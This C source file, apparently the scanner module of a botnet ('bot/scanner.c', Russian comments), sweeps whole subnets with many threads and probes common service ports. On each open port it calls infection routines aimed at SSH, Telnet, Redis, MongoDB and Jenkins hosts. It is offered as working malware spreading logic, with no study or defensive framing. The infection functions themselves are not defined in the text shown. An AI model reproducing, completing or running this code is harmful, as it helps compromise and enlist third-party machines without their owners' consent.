// bot/scanner.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>
#include <netdb.h>
#include "config.h"

// Список портов для сканирования
int common_ports[] = {22, 23, 80, 443, 8080, 8443, 3306, 6379, 27017, 9200, 11211, 53, 123, 161};
int port_count = 14;

// Структура для сканирования
typedef struct {
    char ip[16];
    int start_port;
    int end_port;
} scan_task_t;

// Проверка порта
int check_port(const char* ip, int port, int timeout_sec) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) return 0;
    
    struct timeval timeout;
    timeout.tv_sec = timeout_sec;
    timeout.tv_usec = 0;
    
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);
    
    int result = connect(sock, (struct sockaddr*)&server, sizeof(server));
    close(sock);
    
    return (result == 0);
}

// Сканирование одного IP
void* scan_ip(void* arg) {
    char* ip = (char*)arg;
    
    for(int i = 0; i < port_count; i++) {
        int port = common_ports[i];
        
        if(check_port(ip, port, 1)) {
            printf("[+] Found open port: %s:%d\n", ip, port);
            
            // Пытаемся заразить
            if(port == 22) infect_ssh(ip, port);
            else if(port == 23) infect_telnet(ip, port);
            else if(port == 6379) infect_redis(ip, port);
            else if(port == 27017) infect_mongodb(ip, port);
            else if(port == 8080) infect_jenkins(ip, port);
        }
    }
    
    return NULL;
}

// Сканирование подсети
void scan_network(const char* subnet) {
    printf("[+] Scanning network: %s\n", subnet);
    
    // Парсинг CIDR
    char network[16];
    int mask = 24;
    sscanf(subnet, "%[^/]/%d", network, &mask);
    
    // Генерация IP адресов
    struct in_addr ip, netmask, network_addr, broadcast;
    
    inet_aton(network, &ip);
    netmask.s_addr = htonl(~((1 << (32 - mask)) - 1));
    network_addr.s_addr = ip.s_addr & netmask.s_addr;
    broadcast.s_addr = network_addr.s_addr | ~netmask.s_addr;
    
    // Сканируем все хосты в сети
    pthread_t threads[256];
    int thread_count = 0;
    
    for(unsigned int addr = ntohl(network_addr.s_addr) + 1; 
        addr < ntohl(broadcast.s_addr); 
        addr++) {
        
        struct in_addr current_ip;
        current_ip.s_addr = htonl(addr);
        char* ip_str = inet_ntoa(current_ip);
        
        pthread_create(&threads[thread_count], NULL, scan_ip, (void*)strdup(ip_str));
        thread_count++;
        
        if(thread_count >= 256) {
            for(int i = 0; i < thread_count; i++) {
                pthread_join(threads[i], NULL);
            }
            thread_count = 0;
        }
    }
    
    // Ждем оставшиеся потоки
    for(int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("[+] Network scan completed\n");
}